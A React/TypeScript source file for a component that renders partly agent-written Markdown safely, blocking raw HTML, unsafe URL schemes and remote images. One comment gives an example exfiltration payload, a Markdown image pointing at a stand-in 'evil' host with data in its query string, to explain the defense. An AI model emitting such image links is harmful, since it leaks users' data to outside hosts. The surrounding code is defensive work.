import { isValidElement, type ComponentPropsWithoutRef } from 'react'
import Markdown, { defaultUrlTransform, type Components, type UrlTransform } from 'react-markdown'
import remarkGfm from 'remark-gfm'

/**
 * react-markdown's default drops every URL scheme but http(s), mailto and a few others (so `javascript:` never
 * reaches the DOM). Inline `data:image/` is let through for image sources only — an `<img>` never runs script —
 * so `SafeImage` can show it; links keep the default.
 */
const urlTransform: UrlTransform = (url, key, node) =>
  key === 'src' && node.tagName === 'img' && /^data:image\//i.test(url.trim()) ? url : defaultUrlTransform(url)

type HeadingProps = ComponentPropsWithoutRef<'h1'> & { node?: unknown }

/** react-markdown passes its syntax-tree `node`; it must not reach the DOM. */
function withoutNode<T extends { node?: unknown }>(props: T): Omit<T, 'node'> {
  const copy = { ...props }
  delete copy.node
  return copy
}

/** Markdown headings sit below the page's h1 (project) and h2 (artifact type), so `#` renders as h3. */
const shifted = (Tag: 'h3' | 'h4' | 'h5' | 'h6') =>
  function ShiftedHeading(props: HeadingProps) {
    return <Tag {...withoutNode(props)} />
  }

const components: Components = {
  h1: shifted('h3'),
  h2: shifted('h4'),
  h3: shifted('h5'),
  h4: shifted('h6'),
  h5: shifted('h6'),
  h6: shifted('h6'),
  a: (props) => <a {...withoutNode(props)} rel="noopener noreferrer nofollow" />,
  img: SafeImage,
  pre: CodeBlock,
}

type PreProps = ComponentPropsWithoutRef<'pre'> & { node?: unknown }

/** The fenced block's language, from the `language-xxx` class react-markdown puts on the inner `<code>`. */
function codeLanguage(children: unknown): string | undefined {
  if (!isValidElement<{ className?: unknown }>(children)) {
    return undefined
  }
  const { className } = children.props
  return typeof className === 'string' ? /(?:^|\s)language-([\w+#.-]+)/.exec(className)?.[1] : undefined
}

/**
 * NFR-A11Y (axe `scrollable-region-focusable`, WCAG 2.1.1): a code block scrolls horizontally, so it must be reachable
 * by keyboard to scroll it. It's a named group (not a landmark, so several blocks don't need unique names) in the tab
 * order; the global `:focus-visible` outline shows focus.
 */
function CodeBlock(props: PreProps) {
  const rest = withoutNode(props)
  const language = codeLanguage(rest.children)
  return <pre {...rest} role="group" tabIndex={0} aria-label={language ? `Code block (${language})` : 'Code block'} />
}

/**
 * Whether an image source may load: a same-origin relative path (`/x.png`, `./x.png`, `x.png`) or an inline
 * `data:image/` URL. Anything with a scheme or a host (`https://…`, protocol-relative `//…`) is refused.
 */
function isSafeImageSrc(src: string): boolean {
  const value = src.trim()
  if (value.toLowerCase().startsWith('data:image/')) {
    return true
  }
  // A scheme (`https:`, `ftp:`…) or a protocol-relative `//host` (also `\\host` or `/\host`, which browsers treat
  // alike) leaves the origin.
  return !/^[a-z][a-z0-9+.-]*:/i.test(value) && !/^[/\\]{2}/.test(value)
}

type ImageProps = ComponentPropsWithoutRef<'img'> & { node?: unknown }

/**
 * NFR-SEC: artifact Markdown is partly agent-written, and loading `![x](https://evil/x?d=…)` would leak data to that
 * host (and reveal who viewed it). Remote images render as a plain link with the alt text and URL instead; only
 * same-origin paths and inline `data:image/` load (the CSP's `img-src 'self' data:` enforces the same).
 */
function SafeImage(props: ImageProps) {
  const { src, alt, title } = withoutNode(props)
  const url = typeof src === 'string' ? src : ''
  if (url && isSafeImageSrc(url)) {
    return <img src={url} alt={alt ?? ''} title={title} />
  }
  const text = alt?.trim() ? alt : 'Image'
  if (!url) {
    return <span>[{text}]</span>
  }
  return (
    <a href={url} rel="noopener noreferrer nofollow" title={title}>
      {text} (external image, not loaded: {url})
    </a>
  )
}

/**
 * FR-21: an artifact's Markdown, rendered safely. react-markdown builds React elements from the Markdown syntax tree:
 * raw HTML in the content is never rendered (no rehype-raw) and unsafe URLs (e.g. `javascript:`) are removed.
 * GitHub-flavoured Markdown (tables, task lists, strikethrough) via remark-gfm.
 */
export function MarkdownView({ content, label }: { content: string; label: string }) {
  return (
    <article aria-label={label} className="markdown-body">
      <Markdown remarkPlugins={[remarkGfm]} components={components} urlTransform={urlTransform} skipHtml>
        {content}
      </Markdown>
    </article>
  )
}
